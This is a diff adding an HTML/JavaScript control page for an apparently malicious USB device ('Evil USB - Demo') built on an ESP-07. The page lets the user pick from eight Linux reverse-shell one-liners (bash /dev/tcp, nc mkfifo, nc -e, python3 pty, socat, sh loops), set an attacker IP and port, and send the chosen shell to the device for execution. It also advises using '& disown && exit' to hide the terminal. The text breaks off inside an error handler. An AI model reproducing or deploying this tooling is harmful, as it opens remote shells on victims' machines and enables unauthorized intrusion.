@@ -1,0 +1,1262 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="favicon-48x48.png" sizes="48x48" type="image/png">
+    <title>Evil Corp</title>
+    <style>
+    
+    
+        /* Basic styling for html and body */
+        html,
+        body {
+			height: 100%;                          /* Ensures the body takes full height of the viewport */
+			margin: 0;                             /* Removes default margin around the page */
+			padding: 0;                            /* Removes default padding */
+			font-family: "Inter", sans-serif;      /* Sets a modern sans-serif font for the body */
+			background-color: #efefef;             /* Sets a light gray background color for the page */
+		}
+
+
+
+        /* Flexbox layout to ensure footer stays at the bottom of the page */
+        body {
+			display: flex;                         /* Uses flexbox layout for the page */
+			flex-direction: column;                /* Stacks elements vertically */
+			min-height: 100vh;                     /* Ensures the body takes at least the full height of the viewport */
+		}
+
+
+
+        main {
+			flex: 1;                               /* Makes the main section occupy the available space between header and footer */
+			padding: 20px;                         /* Adds padding inside the main content */
+			background-color: #f0f0f0;             /* Light gray background color for the main content */
+		}
+
+
+
+        /***********************       Footer Styling        ***********************/
+        
+        /***************************************************************************/
+       
+		/* Footer styling for bottom of the page */
+        footer {
+			text-align: center;                    /* Centers the content inside the footer */
+			padding: 10px;                         /* Adds padding around the footer content */
+			background-color: #333;                /* Dark background for the footer */
+			color: white;                          /* Sets the text color to white */
+			margin-top: auto;                      /* Pushes the footer to the bottom if there's extra space */
+			font-size: 18px; 					   /* Text size in px */
+		}
+
+
+
+
+
+        /***********************        Navbar styling       ***********************/
+        
+        /***************************************************************************/
+        .navbar {
+			background-color: #444444;             /* Dark background color for the navbar */
+			padding: 10px;                         /* Adds padding around navbar */
+			text-align: center;                    /* Centers navbar content */
+		}
+
+
+
+        /* Styling for links in the navbar */
+        .navbar a {
+			color: white;                           /* Sets link text color to white */
+			padding: 10px;                          /* Adds padding inside the links */
+			text-decoration: none;                  /* Removes underline from the links */
+			margin: 0 10px;                         /* Adds horizontal spacing between links */
+			font-family: "Lato", sans-serif;        /* Sets a clean sans-serif font for the links */
+			font-size: 18px;                        /* Makes the font size larger for readability */
+			text-transform: uppercase;              /* Makes the link text uppercase */
+			cursor: pointer;                        /* Changes cursor to pointer on hover */
+			transition: color 0.5s;                 /* Smooth color transition on hover */
+			position: relative;                     /* Needed for pseudo-element positioning */
+		}
+
+
+
+
+        /* Hover effects for navbar links */
+        .navbar a:hover {
+			background-color: #555555; 				/* Lighter background on hover */
+			color: #95a5a6; 						/* Changes text color on hover */
+        }
+
+
+		/* Adds an underline effect on navbar links on hover */
+        .navbar a::after {
+			content: "";                            /* Creates a pseudo-element */
+			position: absolute;                     /* Positions the pseudo-element */
+			width: 100%;                            /* Full width for the underline */
+			height: 2px;                            /* Height of the underline */
+			top: 100%;                              /* Places it below the link */
+			left: 0;
+			background: #ff7000;                    /* Orange color for the underline */
+			transition: transform 0.5s;              /* Smooth animation */
+			transform: scaleX(0);                   /* Starts as invisible */
+			transform-origin: right;                /* Animation grows from the right side */
+		}
+
+
+        .navbar a:hover::after {
+			transform: scaleX(1);                   /* Expands the underline on hover */
+			transform-origin: left;                 /* Animation grows to the left */
+        }
+
+
+		/* Navbar list styling */
+        .navbar ul {
+			display: flex;                          /* Uses flexbox to layout the items */
+			gap: 2rem;                            /* Adds horizontal space between items */
+			list-style-type: none;                  /* Removes default list styling */
+			margin: 0;                              /* Removes default margin */
+			padding: 0;                             /* Removes default padding */
+			width: 100%;                            /* Makes the list take the full width */
+			justify-content: space-between;         /* Distributes items between left and right */
+		}	
+
+
+		/* Aligns logout button to the far right */
+        .navbar>ul>li:last-child {
+            margin-left: auto;						/* This pushes the logout button to the far right */
+        }
+        
+        
+        
+
+        /*******************    Container styling for content    *******************/
+        
+        /***************************************************************************/
+        .container {
+			width: 80%; 									/* Container width set to 80% of the screen */
+			margin: 20px auto; 								/* Centers the container horizontally with margin on top and bottom */
+			background-color: white; 						/* White background for the container */
+			padding: 20px; 									/* Padding inside the container for spacing */
+			box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1); 	/* Light shadow for depth effect */
+		}
+
+        .TextScramble_container {
+			width: 80%; 									/* Container width set to 80% of the screen */
+			margin: 20px auto; 								/* Centers the container horizontally with margin on top and bottom */
+			padding: 20px; 									/* Padding inside the container for spacing */
+			box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1); 	/* Light shadow for depth effect */
+			background-color: #f0f0f0; 						/* Light gray background */
+		}
+
+        .warning {
+			width: 80%; 									/* Container width set to 80% of the screen */
+			margin: 20px auto; 								/* Centers the container horizontally with margin on top and bottom */
+			background-color: #f0f0f0; 						/* White background for the container */
+			padding: 10px; 									/* Padding inside the container for spacing */
+			box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1); 	/* Light shadow for depth effect */
+			border-radius: 5px;       						/* Optional: Rounds the corners */
+		}
+
+        /* Category section styling */
+        .category {
+			font-family: "Verdana", "Arial", sans-serif;
+			font-weight: bold;                      		/* Makes category text bold */
+			font-size: 32px;                        		/* Large font size for categories */
+			line-height: 50px;                      		/* Spacing between lines */
+			padding: 20px 10px 0px 10px;            		/* Adds padding around the category section */
+			color: #000000;                         		/* Sets text color to black */
+			margin: 0 auto;                         		/* Centers the category section */
+		}
+
+
+
+
+
+        /***********************      Body Text Styling      ***********************/
+        
+        /***************************************************************************/
+        .bodytext {
+			font-family: "Verdana", "Arial", sans-serif;  	/* Sets font family for body text */
+			font-size: 18px;                         		/* Font size for readability */
+			text-align: left;                        		/* Aligns text to the left */
+        }
+
+
+
+
+
+
+
+
+        /***********************        Button styling       ***********************/
+        
+        /***************************************************************************/
+        .btn {
+			background-color: #444444;              /* Dark background for the button */
+			border: none;                           /* Removes default border */
+			color: white;                           /* Sets button text color to white */
+			padding: 10px 20px;                     /* Adds padding inside the button */
+			font-size: 16px;                        /* Font size for button text */
+			cursor: pointer;                        /* Changes cursor to pointer on hover */
+		}
+
+
+
+        .btn:hover {
+            background-color: #555555;				/* Lighter background on hover */
+        }
+
+
+
+
+
+		/***********************        Table Styling       ***********************/
+		
+		/***************************************************************************/
+		
+        table {
+			width: 100%;                            /* Table takes the full width */
+			table-layout: fixed;                    /* Fixed table layout for equal column widths */
+			margin: 0 auto;                         /* Centers the table horizontally */
+			border-spacing: 0px;                    /* Removes default space between table cells */
+		}
+
+
+        tr {
+			border: 1px solid white;                			/* Adds a white border between rows */
+			font-family: "Verdana", "Arial", sans-serif;  		/* Sets a readable font for table rows */
+			font-size: 20px;                        			/* Larger font for better readability */
+		}
+
+        th {
+			height: 20px;                           /* Fixed height for header cells */
+			padding: 3px 15px;                      /* Adds padding to header cells */
+			text-align: left;                       /* Aligns text to the left */
+			background-color: #343a40;              /* Dark background for table headers */
+			white-space: nowrap;                    /* Prevents wrapping text in header */
+			overflow: hidden;                       /* Ensures overflow is hidden */
+			text-overflow: ellipsis;                /* Shows ellipsis if text overflows */
+			color: #FFFFFF !important;              /* Forces white text color */
+		}
+
+
+        td {
+			height: 20px;                           /* Fixed height for table data cells */
+			padding: 3px 15px;                      /* Adds padding to data cells */
+			text-align: left;                       /* Aligns text to the left */
+			white-space: nowrap;                    /* Prevents wrapping text in data cells */
+			overflow: hidden;                       /* Hides overflow content */
+			text-overflow: ellipsis;                /* Shows ellipsis if text overflows */
+			border-bottom: 1px solid #343a40;       /* Adds a border to the bottom of data cells */
+			width: 20%;                             /* Defines the width of each cell */
+		}
+
+        /* Text Box Styling */
+        .text-box {
+			position: relative;                     /* Allows absolute positioning inside the text box */
+			display: flex;                          /* Flexbox for aligning content */
+			align-items: center;                    /* Centers content vertically */
+			justify-content: center;                /* Centers content horizontally */
+		}
+
+        h1 {
+			font-size: 2vw;                         /* Responsive font size based on viewport width */
+			font-weight: 900;                       /* Makes the font bold */
+			background-color: #000;                 /* Black background for the heading */
+			color: #fff;                            /* White text color */
+			display: block;                         /* Makes the heading a block element */
+			padding: 0.5em;                         /* Adds padding inside the heading */
+		}
+
+        h1:nth-child(2) {
+            position: absolute;
+            background-color: #fff;
+            color: #000;
+            clip-path: inset(-1% -1% 50% -10%);		/* Prevents "bleed" in Chrome */
+        }
+
+
+
+        /***********************        Modal Styling        ***********************/
+        
+        /***************************************************************************/
+        .modal {
+			display: none;                          /* Hidden by default */
+			position: fixed;                        /* Fixed position on the screen */
+			z-index: 1000;                          /* Ensures modal appears above other content */
+			left: 0;                                /* Aligns modal to the left of the screen */
+			top: 0;                                 /* Aligns modal to the top of the screen */
+			width: 100%;                            /* Full width */
+			height: 100%;                           /* Full height */
+			background-color: rgba(0, 0, 0, 0.4);   /* Semi-transparent black background */
+		}
+
+        .modal-content {
+			background-color: #5d6d7e;              /* Modal background color */
+			color: white;                           /* Text color for the modal */
+			border: 2px solid #2c3e50;              /* Border around modal */
+			border-radius: 15px;                    /* Rounded corners for modal */
+			margin: auto;                           /* Centers the modal */
+            padding: 20px;
+            width: 80%;
+            max-width: 600px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            position: absolute;
+            text-align: center;
+        }
+
+        /* Modal Error Styling */
+        .modal-error .modal-content {
+            background-color: #cd6155;
+            border-color: darkred;
+            color: black;
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+
+        /* Centering Button in Modal */
+        #reverseShellModal .modal-content .btn {
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+
+        /***************   Responsive Design with Media Queries   ******************/
+        						/* For Mobile Devices */
+        /***************************************************************************/
+        
+		@media only screen and (max-width: 480px) {
+
+			/* Adjust the width and padding for the dropdown on small screens */
+			#shellTypeDropdown {
+				width: 90%;             /* Set width to 90% of the parent container */
+				padding: 5px;           /* Add padding inside the dropdown for better appearance */
+			}
+
+			/* Ensure the page has a maximum height equal to the viewport height */
+			html, body {
+				height: 100%;           /* Ensure the body takes up the full height of the window */
+				max-height: 100vh;      /* Set the maximum height to the viewport height */
+				margin: 0;              /* Remove default margin */
+				padding: 0;             /* Remove default padding */
+				overflow: hidden;       /* Prevent the page from exceeding the vertical space */
+			}
+
+			/* Restrict the height for the body content and footer */
+			body {
+				display: flex;          /* Use flexbox to manage layout */
+				flex-direction: column; /* Arrange children in a vertical direction */
+				max-height: 480px;      /* Set the maximum height to 480px for smaller screens */
+			}
+
+			/* Allow the main content to grow and scroll if necessary */
+			main {
+				flex-grow: 1;           /* The content will expand to take the remaining space */
+				overflow-y: auto;       /* Enable vertical scrolling if content overflows */
+			}
+
+			/* Apply text overflow and hide any excess content in the footer */
+			footer {
+				overflow: hidden;       /* Hide overflow content */
+				text-overflow: ellipsis;/* Add ellipsis for overflowed text */
+				white-space: nowrap;    /* Prevent text from wrapping */
+			}
+
+
+
+			/* Adjust navbar to be left-aligned on small screens */
+			.navbar {
+				text-align: left;       /* Align navbar links to the left */
+			}
+
+			/* Adjust navbar link padding and font size */
+			.navbar a {
+				padding: 8px;           /* Reduce padding for smaller screens */
+				font-size: 14px;        /* Set a smaller font size for mobile devices */
+			}
+
+			/* Adjust the font size for body text */
+			.bodytext {
+				font-size: 14px;        /* Set font size for body text */
+			}
+
+			/* Adjust button padding and font size */
+			.btn {
+				padding: 5px 10px;      /* Set padding for buttons */
+				font-size: 12px;        /* Set smaller font size for buttons */
+			}
+
+			/* Ensure table takes up full width on smaller screens */
+			table {
+				width: 100%;            /* Table can take full width on smaller screens */
+			}
+
+			/* Adjust table cell width for better adaptation */
+			td {
+				width: auto;            /* Automatically adjust cell width */
+			}
+
+			/* Adjust the font size for category headings */
+			.category {
+				font-size: 24px;        /* Set font size for categories */
+			}
+			
+		}
+
+        
+        
+        
+        /***************   Responsive Design with Media Queries   ******************/
+        				/* For Tablets (Landscape and Portrait) */
+        /***************************************************************************/
+        @media (max-width: 768px) {
+            .container {
+                width: 90%;					/* Slightly less width on tablets */
+                padding: 15px;				/* Adjusted padding for tablets */
+            }
+
+            .navbar {
+                text-align: center;			/* Center navbar on tablets */
+            }
+        }
+
+
+
+
+        /*******************   For Desktops and Larger Screens   *******************/
+        
+        /***************************************************************************/
+        @media (min-width: 1024px) {
+            .container {
+                width: 80%;					/* Default width for desktop */
+                padding: 20px;				/* Padding for desktop */
+            }
+
+            .navbar {
+                text-align: center;			/* Center navbar on larger screens */
+            }
+        }
+
+
+
+
+        /***************************        Glitch       ***************************/
+        						/*Box-sizing for all elements */
+        /***************************************************************************/
+        *,
+        *::after,
+        *::before {
+            box-sizing: border-box;
+        }
+
+        .stack {
+            display: grid;
+            grid-template-columns: 1fr;
+        }
+
+        .stack span {
+            font-weight: bold;
+            grid-row-start: 1;
+            grid-column-start: 1;
+            font-size: 2rem;
+            --stack-height: calc(100% / var(--stacks) - 1px);
+            --inverse-index: calc(calc(var(--stacks) - 1) - var(--index));
+            --clip-top: calc(var(--stack-height) * var(--index));
+            --clip-bottom: calc(var(--stack-height) * var(--inverse-index));
+            clip-path: inset(var(--clip-top) 0 var(--clip-bottom) 0);
+            animation: stack 340ms cubic-bezier(.46, .29, 0, 1.24) 1 backwards calc(var(--index) * 120ms), glitch 2s ease infinite 2s alternate-reverse;
+        }
+
+        .stack span:nth-child(odd) {
+            --glitch-translate: 8px;
+        }
+
+        .stack span:nth-child(even) {
+            --glitch-translate: -8px;
+        }
+
+        @keyframes stack {
+            0% {
+                opacity: 0;
+                transform: translateX(-50%);
+                text-shadow: -2px 3px 0 red, 2px -3px 0 blue;
+            }
+
+            ;
+
+            60% {
+                opacity: 0.5;
+                transform: translateX(50%);
+            }
+
+            80% {
+                transform: none;
+                opacity: 1;
+                text-shadow: 2px -3px 0 red, -2px 3px 0 blue;
+            }
+
+            100% {
+                text-shadow: none;
+            }
+        }
+
+        @keyframes glitch {
+            0% {
+                text-shadow: -2px 3px 0 red, 2px -3px 0 blue;
+                transform: translate(var(--glitch-translate));
+            }
+
+            2% {
+                text-shadow: 2px -3px 0 red, -2px 3px 0 blue;
+            }
+
+            4%,
+            100% {
+                text-shadow: none;
+                transform: none;
+            }
+        }
+
+
+
+
+  		/***********************    Logout button styling    ***********************/
+		      /* Creates a visually distinct button with hover effects */
+		/***************************************************************************/
+  		.logout-btn {
+			background-color: #808080;          			/* Neutral gray background */
+			color: white;                       			/* White text for contrast */
+			padding: 10px 20px;                 			/* Inner spacing for the button */
+			text-decoration: none;              			/* Removes underline */
+			border-radius: 5px;                 			/* Smooth rounded corners */
+			transition: background-color 0.3s ease; 		/* Smooth transition on hover */
+		}
+
+
+
+		/* Changes the button's background color on hover for interactivity */
+		.logout-btn:hover {
+			background-color: #555555;  					/* Darker gray background on hover */
+		}
+		
+		
+		#warningSection {
+			font-size: 20px; /* Increase the font size for the section */
+			font-weight: bold; /* Make the entire section bold */
+			margin: 10px 0; /* Add some spacing */
+		}
+
+		#warningCon {
+			font-weight: normal; /* Keep the 'Warning' text normal */
+			font-size: 22px; /* Optional: Adjust its size */
+			font-weight: 900;                       /* Makes the font bold */
+		}
+
+		#warningContainer.green {
+			color: green; /* Green color for the success message */
+			font-size: 14px; /* Optional: Adjust its size */
+			font-weight: 500;                       /* Makes the font bold */
+		}
+
+		#warningContainer.red {
+			color: #e74c3c; /* Light red color for the mkfifo warning */
+			font-size: 14px; /* Optional: Adjust its size */
+			font-weight: 500;                       /* Makes the font bold */
+		}
+		
+
+		
+    </style>
+</head>
+
+
+<body id="main-body" onload="process()">
+
+    <!-- Navigation bar section -->
+	<div class="navbar">
+		<ul style="display: flex; gap: 2.5rem; list-style-type: none; margin: 0; padding: 0;">
+		
+		    <!-- Link to the Home page -->
+		    <li><a href="#" id="homeLink">Home</a></li>
+		    
+		    <!-- Link to the Access Point (AP) Settings -->
+		    <li><a href="#" id="wifi_settings">AP_Settings</a></li>
+		    
+		    <!-- Link to the About page -->
+		    <li><a href="#" id="aboutLink">About</a></li>
+		    
+		    <!-- Logout button for user -->
+		    <li><a href="#" id="logoutLink" class="logout-btn">Logout</a></li>
+		</ul>
+	</div>
+
+
+
+
+    <!-- Section displaying a stacked "Evil Corp" text effect -->
+    <div class="container">
+		  <div class="stack" style="--stacks: 3;">
+		  
+		  
+			<!-- Repeated text for visual stacking effect -->
+			<span style="--index: 0;">Evil Corp</span>
+			<span style="--index: 1;">Evil Corp</span>
+			<span style="--index: 2;">Evil Corp</span>
+		  </div>
+	</div>
+	
+	
+   
+    <div class="TextScramble_container">
+       <div class="text"></div>
+    </div>
+
+
+
+    <!-- Main container for configuration and reverse shell selection -->
+    <main class="container" style="margin-top:40px">
+    
+        <!-- Section for configuring IP and port settings -->
+        <div class="category">IP & Port Configuration</div>
+        <div class="ip-port-container">
+        
+            <!-- Input field for entering IP address -->
+            <input type="text" id="ipInput" class="input-field" placeholder="Enter IP Address">
+            
+            <!-- Input field for entering port -->
+            <input type="text" id="portInput" class="input-field" placeholder="Enter Port">
+            
+            <!-- Button to update the IP and port -->
+            <button type="button" class="btn" id="runBtn" onclick="updateIPPort()">Set</button>
+        </div>
+        
+        
+
+        <br>
+
+        <!-- Section for choosing a reverse shell -->
+        <div class="category">Choose Reverse Shell</div>
+        <div class="shell">
+            <!-- Table displaying options for reverse shells -->
+            <table>
+                <colgroup>
+                
+                    <!-- Column group styling -->
+                    <col span="1" style="background-color:rgb(230,230,230); width: 20%; color:#000000;">
+                    <col span="1" style="background-color:rgb(200,200,200); width: 50%; color:#000000;">
+                    <col span="1" style="background-color:rgb(180,180,180); width: 15%; color:#000000;">
+                    <col span="1" style="background-color:rgb(230,230,230); width: 15%; color:#000000;">
+                </colgroup>
+                <tr>
+                
+                    <!-- Table headers -->
+                    <th><div class="bodytext" id="shellHeader">Shell Type</div></th>
+                    <th><div class="bodytext" id="exampleHeader">Example Command</div></th>
+                    <th><div class="bodytext" id="osHeader">Operating System</div></th>
+                    <th><div class="bodytext" id="runHeader">Run</div></th>
+                </tr>
+                
+                
+                
+                <tr>
+                    <td>
+                    
+					<!-- Dropdown menu for selecting the shell type -->
+					<select id="shellTypeDropdown" onchange="updateOperatingSystemText(); updateExampleCommand(); updateIPPort(); checkWarning();">
+
+						<!-- Options for different shell types -->
+						<option value="bash" selected>bash -i</option>
+						<option value="mkfifo">nc mkfifo</option>
+						<option value="nc">nc -e</option>
+						<option value="python3">python3</option>
+						<option value="socat">socat</option>
+						<option value="socat-tty">socat-tty</option>
+						<option value="sh-196">sh-196</option>
+						<option value="sh-loop">sh-loop</option>
+					</select>
+
+                    </td>
+
+
+                    <td>
+                        <!-- Displays example command for the selected shell -->
+                        <div class="bodytext" id="reverseShellText"></div>
+                    </td>
+                    
+                    
+                    <td>
+                        <!-- Displays the operating system associated with the selected shell -->
+                        <div class="bodytext" id="operatingSystemText">Linux</div>
+                    </td>
+                    
+                    
+                    <td>
+                        <!-- Button to execute the selected reverse shell command -->
+                        <button type="button" class="btn" onclick="ButtonPress(1)">Run</button>
+                    </td>
+                    
+                </tr>
+            </table>
+        </div>
+        
+
+
+        <br>
+        
+    </main>
+
+    <div class="warning">
+		<!-- Warning section -->
+		<div id="warningSection">
+			<div id="warningCon">Warning: </div>
+			<br>   
+			<div id="warningContainer">The shell is running properly.</div>
+		</div>
+	</div>
+
+
+    <footer class="footer" id="temp">Evil USB - Demo</footer>
+
+
+
+<!-- 
+This code defines and manages a modal window for displaying feedback or executing commands. 
+The modal includes dynamic content that varies based on user interaction, with specific buttons for execution or closing the modal.
+It is paired with a JavaScript function that updates the modal based on the selected reverse shell type, showcasing flexibility in adapting to user input. 
+The modal and the script work together to create an interactive and user-friendly interface.
+-->
+
+<!-- Modal window for displaying messages or executing commands -->
+<div id="reverseShellModal" class="modal">
+    <!-- Content of the modal window -->
+    <div class="modal-content">
+        <!-- Close button for the modal, using an "x" symbol -->
+        <span class="close" onclick="closeModal()">&times;</span>
+        <!-- Dynamic text content for the modal -->
+        <p id="modalText"></p>
+        <!-- Button for executing the command, displayed only if there is no error -->
+        <button type="button" class="btn" id="runButton" onclick="runCommand()">Run</button>
+        <!-- Button for closing the modal, displayed only in case of an error -->
+        <button type="button" class="btn" id="closeButton" onclick="closeModal()">Close</button>
+    </div>
+</div>
+
+
+
+
+
+
+
+<script>
+
+// Function to check the selected shell type and display a warning or confirmation
+function checkWarning() {
+    
+        // Get the selected reverse shell type from the dropdown menu
+        const selectedShell = document.getElementById("shellTypeDropdown").value;
+
+        // Reference to the element where the operating system text will be displayed
+        const warningContainerText = document.getElementById("warningContainer");
+
+		// Reset the classes for color before adding new one
+		warningContainerText.classList.remove("green", "red");
+
+        // Update the operating system text based on the selected shell type
+		switch (selectedShell) {
+			case "bash":
+			case "nc":
+			case "python3":
+			case "socat":
+			case "socat-tty":
+			case "sh-196":
+			case "sh-loop":
+				warningContainerText.textContent = "The shell can safely use '& disown && exit' to close the terminal after initiating the shell.";
+				warningContainerText.classList.add("green"); // Add green color class
+				break;
+			case "mkfifo":
+				warningContainerText.innerHTML = 
+					"Using the mkfifo shell type requires the process to remain in the foreground.<br>" +
+					"This means you cannot use '& disown && exit' as it will terminate the shell.<br>" +
+					"This shell keep the terminal open to maintain the connection.";
+				warningContainerText.classList.add("red"); // Add red color class
+				break;
+			default:
+				warningContainerText.textContent = "Unknown shell type selected. Please choose a valid shell type.";
+				warningContainerText.classList.remove("green", "red"); // Remove color classes for unknown case
+		}
+    }
+
+
+
+
+/**
+ * Updates the operating system display text based on the selected reverse shell type.
+ * This function ensures the user is aware of the shell's compatibility with specific operating systems.
+ */
+    function updateOperatingSystemText() {
+    
+        // Get the selected reverse shell type from the dropdown menu
+        const selectedShell = document.getElementById("shellTypeDropdown").value;
+
+        // Reference to the element where the operating system text will be displayed
+        const operatingSystemText = document.getElementById("operatingSystemText");
+
+        // Update the operating system text based on the selected shell type
+		switch (selectedShell) {
+			case "bash":
+			case "mkfifo":
+			case "nc":
+			case "python3":
+			case "socat":
+			case "socat-tty":
+			case "sh-196":
+			case "sh-loop":
+				operatingSystemText.textContent = "Linux";
+				break;
+			default:
+				operatingSystemText.textContent = "Unknown";
+		}
+    }
+
+
+
+
+
+
+
+/**
+ * This function updates the reverse shell example command dynamically based on the selected shell type
+ * and the IP address and port entered by the user. It provides real-time feedback to help users
+ * generate the correct reverse shell command tailored to their input.
+ */
+	function updateExampleCommand() {
+		// Retrieve input values or default to 127.0.0.1:9001
+		const ipAddress = document.getElementById('ipInput').value || "127.0.0.1";
+		const port = document.getElementById('portInput').value || "9001";
+
+		// Get the selected reverse shell type
+		const selectedShell = document.getElementById("shellTypeDropdown").value;
+
+		// Define shell command templates
+		const shellCommands = {
+		    "bash": `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
+		    "mkfifo": `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ipAddress} ${port} >/tmp/f`,
+		    "nc": `nc ${ipAddress} ${port} -e sh`,
+		    "python3": `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ipAddress}",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,
+		    "socat": `socat TCP:${ipAddress}:${port} EXEC:sh`,
+		    "socat-tty": `socat TCP:${ipAddress}:${port} EXEC:'sh',pty,stderr,setsid,sigint,sane`,
+		    "sh-196": `0<&196;exec 196<>/dev/tcp/${ipAddress}/${port}; sh <&196 >&196 2>&196`,
+		    "sh-loop": `exec 5<>/dev/tcp/${ipAddress}/${port}; while read line 0<&5; do $line 2>&5 >&5; done`,
+		};
+
+		// Update the reverse shell text
+		document.getElementById('reverseShellText').innerText = shellCommands[selectedShell] || "Invalid shell type selected.";
+	}
+
+    
+
+
+
+
+/**
+ * This event listener ensures that specific functions are called automatically when the page finishes loading.
+ * The functions initialize default values for the operating system and example command fields based on the current
+ * settings, improving user experience by providing pre-populated or default information.
+ */
+document.addEventListener("DOMContentLoaded", function () {
+
+		// Initialize the operating system text based on the default shell type
+		updateOperatingSystemText();
+
+		// Generate the default example command based on the initial values for IP, port, and shell type
+		updateExampleCommand();
+		
+
+		checkWarning();
+		
+	});
+
+
+
+
+
+
+/**
+ * This function updates the reverse shell command based on the entered IP address, port, and selected shell type.
+ * It dynamically generates the reverse shell command and updates the displayed text based on user input, providing
+ * the correct format for executing a reverse shell in various shell environments.
+ */
+	function updateIPPort() {
+		const ipAddress = document.getElementById('ipInput').value || "127.0.0.1";
+		const port = document.getElementById('portInput').value || "9001";
+		const shellType = document.getElementById("shellTypeDropdown").value;
+
+		if (!isValidIP(ipAddress)) {
+		    alert("Please enter a valid IP address.");
+		    return;
+		}
+
+		if (!isValidPort(port)) {
+		    alert("Please enter a valid port number (1-65535).");
+		    return;
+		}
+
+		const commands = {
+		    bash: `bash -i >& /dev/tcp/${ipAddress}/${port} 0>&1`,
+		    mkfifo: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ipAddress} ${port} >/tmp/f`,
+		    nc: `nc ${ipAddress} ${port} -e sh`,
+		    python3: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ipAddress}",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,
+		    socat: `socat TCP:${ipAddress}:${port} EXEC:sh`,
+		    "socat-tty": `socat TCP:${ipAddress}:${port} EXEC:'sh',pty,stderr,setsid,sigint,sane`,
+		    "sh-196": `0<&196;exec 196<>/dev/tcp/${ipAddress}/${port}; sh <&196 >&196 2>&196`,
+		    "sh-loop": `exec 5<>/dev/tcp/${ipAddress}/${port}; while read line 0<&5; do $line 2>&5 >&5; done`,
+		};
+
+		document.getElementById('reverseShellText').innerText = commands[shellType] || "Invalid shell type selected";
+	}
+
+	function isValidIP(ip) {
+		const octets = ip.split(".");
+		if (octets.length !== 4) return false;
+		return octets.every(octet => {
+		    const num = parseInt(octet, 10);
+		    return num >= 0 && num <= 255;
+		});
+	}
+
+	function isValidPort(port) {
+		const num = parseInt(port, 10);
+		return num >= 1 && num <= 65535;
+	}
+
+    
+
+
+
+
+
+/**
+ * JavaScript to handle navigation for the navbar links.
+ * This script listens for click events on the navbar links and redirects the user to the corresponding pages.
+ * Each function is associated with a specific navbar link and uses the window.location.href method to navigate.
+ */
+        document.getElementById('aboutLink').addEventListener('click', function() {
+            window.location.href = "/about"; // Navigate to About page
+        });
+
+        document.getElementById('homeLink').addEventListener('click', function() {
+            window.location.href = "/home"; // Stay on current page
+        });
+        
+        document.getElementById('logoutLink').addEventListener('click', function() {
+            window.location.href = "/logout"; // This will log you out
+        });
+
+        document.getElementById('wifi_settings').addEventListener('click', function() {
+            window.location.href = "/wifi_settings"; // Navigate to Wi-Fi settings page
+        });
+
+
+
+
+
+
+
+/**
+ * Function to display the modal window with dynamic content.
+ * The modal can display either a command to be executed or an error message. 
+ * The appearance of the modal is adjusted based on whether an error is present.
+ */
+		function openModal(text, isError = false) {
+		    var modal = document.getElementById("reverseShellModal");
+		    var modalText = document.getElementById("modalText");
+		    var runButton = document.getElementById("runButton");
+		    var closeButton = document.getElementById("closeButton");
+
+		    if (modal && modalText) {
+		        modalText.innerText = text;
+        		modal.style.display = "block"; 			// Show the modal
+
+
+        		// Set a new function for the runButton click event
+		        runButton.onclick = function() {
+		        
+		        	// Run the command passed as the argument
+		            runCommand(text)
+		        };
+		        
+
+       			 // If there's an error, show the close button and hide the run button
+		        if (isError) {
+				    modal.classList.add("modal-error"); 			// Add a red background class for errors
+				    runButton.style.display = "none"; 				// Hide the run button
+				    closeButton.style.display = "block"; 			// Show the close button
+		            
+		        } else {
+				    modal.classList.remove("modal-error"); 			// Remove error class if it's not an error
+				    runButton.style.display = "block"; 				// Show the run button
+				    closeButton.style.display = "none"; 			// Hide the close button
+		        }
+		    }
+		}
+
+
+
+
+/**
+ * Function to close the modal window.
+ * This hides the modal when called.
+ */
+		function closeModal() {
+		    var modal = document.getElementById("reverseShellModal");
+		    if (modal) {
+		        modal.style.display = "none"; // Zatvori modal
+		    }
+		}
+
+
+
+
+
+/**
+ * Function to send a command to the ESP-07 via an API endpoint.
+ * Handles user input, sends data to the server, and processes the response.
+ * @param {string} text - The command text to be sent.
+ */
+		function runCommand(text) {
+		    // Notify the user that the command is being sent
+		    //alert("Sending command to ESP-07...");
+
+		    // Get the IP address from the input field with ID 'ipInput'
+		    const ipAddress = document.getElementById('ipInput').value || "127.0.0.1";
+
+		    // Get the port number from the input field with ID 'portInput'
+		    const port = document.getElementById('portInput').value || "9001";
+
+		    // Get the selected shell type from the dropdown menu with ID 'shellTypeDropdown'
+		    var selectedShell = document.getElementById("shellTypeDropdown").value;
+
+		    // Create an object containing the data to be sent to the server
+		    const commandData = {
+		        st: selectedShell, 			// Shell type selected by the user
+		        ip: ipAddress, 				// IP address entered by the user
+		        p: port, 					// Port number entered by the user
+		    };
+
+
+
+		    // Use the Fetch API to simulate sending the command to the ESP-07
+		    fetch('/send_command', { 							// Specify the API endpoint '/send_command'
+		            method: 'POST', 							// Set the HTTP method to POST
+		            headers: {
+		                'Content-Type': 'application/json' 		// Specify the content type as JSON
+		            },
+		            body: JSON.stringify(commandData) 			// Convert the commandData object into a JSON string
+		        })
+		        .then(response => response.json()) 				// Parse the JSON response from the server
+		        .then(data => {
+		        
+		            // Check if the response indicates success
+		            if (data.success) {
+		            
+		                // If the command was sent successfully, close the modal window
+		                closeModal();
+
+		                // Notify the user that the command was sent successfully
+		                //alert("Command sent successfully!");
+		                
+		            } else {
+		            
+		                // If the server indicates an error, open an error modal
+		                openModal("Error sending command to ESP-07.", true);
+		            }
+		        })
+		        .catch(error => {
+		        
+		            // If an unexpected error occurs during the fetch, log the error to the console
